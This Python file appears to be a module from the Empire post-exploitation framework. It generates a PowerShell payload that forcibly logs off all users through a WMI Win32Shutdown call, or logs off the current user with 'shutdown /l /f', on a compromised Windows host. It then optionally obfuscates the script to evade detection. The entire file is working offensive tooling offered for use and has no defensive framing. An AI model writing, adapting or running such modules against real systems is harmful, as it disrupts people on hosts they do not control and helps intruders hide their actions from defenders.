from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        all_users = params['AllUsers']

        if all_users.lower() == "true":
            script = "'Logging off all users.'; Start-Sleep -s 3; $null = (gwmi win32_operatingsystem).Win32Shutdown(4)"
        else:
            script = "'Logging off current user.'; Start-Sleep -s 3; shutdown /l /f"

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = helpers.keyword_obfuscation(script)

        return script
